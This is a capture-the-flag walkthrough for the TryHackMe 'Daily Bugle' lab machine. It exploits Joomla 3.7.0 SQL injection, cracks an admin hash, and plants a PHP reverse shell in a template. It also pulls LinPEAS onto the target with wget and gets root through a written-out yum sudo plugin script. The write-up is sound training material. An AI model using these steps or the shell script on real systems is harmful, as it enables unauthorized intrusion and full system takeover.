# Enumeration

A quick autorecon scan reveals a number of open ports. We confirm with an nmap scan.
 
![a6ff4cf9e9f985bd7cb1e2491264d1a9.png](/Daily%20Bugle/_resources/a6ff4cf9e9f985bd7cb1e2491264d1a9.png)

![717a1c54c37a686bbed4a6e2feecea66.png](/Daily%20Bugle/_resources/717a1c54c37a686bbed4a6e2feecea66.png)
 
Let's start enumerating the web server. Along with some shocking news, we find a login form.
 
![f8ba35371648d4632c5f5e8b1f779232.png](/Daily%20Bugle/_resources/f8ba35371648d4632c5f5e8b1f779232.png)
 
Examining the `robots.txt` file from our autorecon output (or just navigating to the `/robots.txt` directory) reveals some potentially interesting directories.

```txt
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Let's check the administrator directory. We find a Joomla login form.
 
![556cdf785bd0990447c6209117bb1981.png](/Daily%20Bugle/_resources/556cdf785bd0990447c6209117bb1981.png)
 
We can get more information using the joomscan tool. After installing joomscan, we use `joomscan -ec -u 10.10.53.236`.  The `-ec` flag tells joomscan to enumerate components. Alternatively, we can look around the webpage a bit more. Some Googling tells us that the Joomla version number can be found at `/language/en-GB/en-GB.xml`.
 
![6fc698e1b5863693652d9c2be6164516.png](/Daily%20Bugle/_resources/6fc698e1b5863693652d9c2be6164516.png)
 
Let's also run a gobuster scan to check for any interesting directories.
```bash
gobuster dir -u <url> -w /usr/share/wordlists/<Wordlist file> -x .php,.txt,.html -s "200" -o output.txt
```
 
![d5f652010da5f71b2afb2ea5073046c0.png](/Daily%20Bugle/_resources/d5f652010da5f71b2afb2ea5073046c0.png)
 
The `README.txt` files gives us some info about Joomla, including the version number (which we found above through a slightly unconventional method).

<br>

# Exploitation

Since we have a service and a version number, we can begin looking for a vulnerability to exploit. Searchsploit tells us that Joomla 3.7.0 is vulnerable to SQL injection.
 
![dbf7b5f5093d2e5e69069c09c2de9107.png](/Daily%20Bugle/_resources/dbf7b5f5093d2e5e69069c09c2de9107.png)
 
We use ``sqlmap -u http://10.10.50.236 --forms --crawl=10``, selecting all default options along the way. After a while, we don't get any results. One option is to do the SQLi manually; see [this link](https://github.com/hack3rman/TryHackMe/blob/master/Daily%20Bugle.md) for a nice writeup.

Some Googling tells us that we can also make use of [this script](https://github.com/XiphosResearch/exploits/tree/master/Joomblah), which is an exploit for Joomla 3.7.0. Run `python2.7 joomblah.py http://10.10.50.236`. (Note: I had to specifically use Python 2.7 here, as the script wasn't running properly.)
 
![1bd76d5497480cfbd64aa3c8feafba9a.png](/Daily%20Bugle/_resources/1bd76d5497480cfbd64aa3c8feafba9a.png)
 
We get a few usernames (one of which we already knew of from the webpage) together with a hash. Let's crack it with hashcat. I typically have some trouble using hashcat on a VM,  so I follow the methodology [here](https://samsclass.info/123/proj10/p12-hashcat.htm) to use an old version of hashcat which my VM could run.

```bash
/home/kali/hash/hashcat-cli32.bin -m 3200 -a 0 -o found.txt hash.txt /usr/share/wordlists/rockyou.txt
```

We specify the path to the binary, and we use:
- `-m` to specify the mode. In this case, I chose 3200 according the list of [hashcat examples](https://hashcat.net/wiki/doku.php?id=example_hashes).
- `-a` specifies the attack mode. 0 corresponds to a dictionary attack.
- `-o` specifies the output file.
- We then specify the file with our hashes (in this case just one), and the path to the wordlist. In this case, we're using `rockyou.txt`.

After exactly 1h 15m, the hash was cracked. This would have gone faster if I had used my Windows host machine to run hashcat, as opposed to my Kali VM image.
 
![afd68c9a45b3e5ad65d0a91905a165b4.png](/Daily%20Bugle/_resources/afd68c9a45b3e5ad65d0a91905a165b4.png)

![35d0c711d7e5c2e106a9637df095cc1a.png](/Daily%20Bugle/_resources/35d0c711d7e5c2e106a9637df095cc1a.png)
 
Now we can log in to Jonah's Joomla account from the administrator login page we found earlier.
 
![901e4e8b85712ca547bd3dc0b82f8d01.png](/Daily%20Bugle/_resources/901e4e8b85712ca547bd3dc0b82f8d01.png)
 
Looking around, we eventually find a page which allows us to edit the templates associated with the Joomla CMS. If we click on the Beez3 template, we see a list of php file which we can potentially exploit. Let's look at the /index.php file.
 
![2efd186e9ae789e0f017c44337ab9493.png](/Daily%20Bugle/_resources/2efd186e9ae789e0f017c44337ab9493.png)

![d9052a8b13b38bdca3e0b2f3d269a9b8.png](/Daily%20Bugle/_resources/d9052a8b13b38bdca3e0b2f3d269a9b8.png)
 
We will use the standard [Pentestmonkey php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). We copy and paste the shell code into the /index.php file, making sure to use our attacking machine IP and a port of our choice.
 
![1fb736dbb57acf3a7ab718fb45c1e930.png](/Daily%20Bugle/_resources/1fb736dbb57acf3a7ab718fb45c1e930.png)
 
Now set up a netcat listener and navigate to `http://10.10.76.10/templates/beez3/index.php` to catch the reverse shell, giving us initial access.
 
![cd460351fcc4cf08333b8354fe9269ac.png](/Daily%20Bugle/_resources/cd460351fcc4cf08333b8354fe9269ac.png)
 
<br>

# Post-exploitation

Let's start by upgrading our shell with `python -c 'import pty; pty.spawn("/bin/bash")'
`. Looking around the file system, we find a directory belonging to `jjameson`, which we don't seem to have access to. Let's try escalating our privilege. Using `find / -perm -u=s -type f 2>/dev/null` to look for files with the SUID bit set, we find some candidates.
 
![83e467cfd5af8ddef71a1a5ca54f5986.png](:/ef6fef1754134cef922e9b441d0216f3)
 
At this point, we check [GTFObins](https://gtfobins.github.io/) to see if we can leverage any of the binaries we found in our search. It doesn't look like this is the right approach. Let's instead use [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) to search for possible privilege escalation methods on the target machine. Download the linpeas.sh file onto the attacking machine, spin up a webserver with `python3 -m http.server`, and download it onto the target machine using `wget <attacking IP>:8000/linpeas.sh`.
 
![def636cb01192ace178966359de736d8.png](:/ba4a4c8d22f5415d9a1d9221bfed94ab)
 
Here I saved the file to the `/tmp` directory so that I don't have to worry about write permissions.
 
![c394d08ab7b3fd4ae59b407365d2a84b.png](:/49124ee91b074e2db96e3c2fd8c77583)
 
Now use `chmod +x linpeas.sh` to mark the file as executable, then run it with `./linpeas.sh`. We find a password in a public PHP config file.
 
![1a34e49fbe938a3d2f25ec3018589374.png](:/a6a1fd03e1814f36bcdd8099d535919d)
 
Earlier we found a user named jjameson, so we can try using the password we just found so switch into his account.
 
![82bbb48b299ce44bf1c3993fad8b731e.png](:/5cc7bd5d61604f0e8e7e8296088f3c80)
 
Success! Navigating to jjameson's home directory gives us the `user.txt` flag.

Now we look for a way to escalate our privilege to obtain the root flag. Using `sudo -l` tells us that jjameson can run the yum binary with sudo privileges.
 
![23809e8f1de19246829b7a180af6c061.png](:/2767ac94131442fc826577a098d2c331)
 
Going back to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/#sudo), we see that yum does not drop elevated privileges when run as sudo. We can spawn a root shell with the following commands:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

(It may be easier to just copy and paste line-by-line directly from GTFOBins.)

As promised, we get a shell with root access which we then use to quickly find the `root.txt` flag.
  
![ad5d66d1a634cc31982f20b70c324841.png](:/cdd46c7f57164638b8ecda9eed6472e9)

![0b2f3894eda28b03b1003c5bad1b1f2c.png](:/0301af5c6f82486da92af6fb437637af)

</center>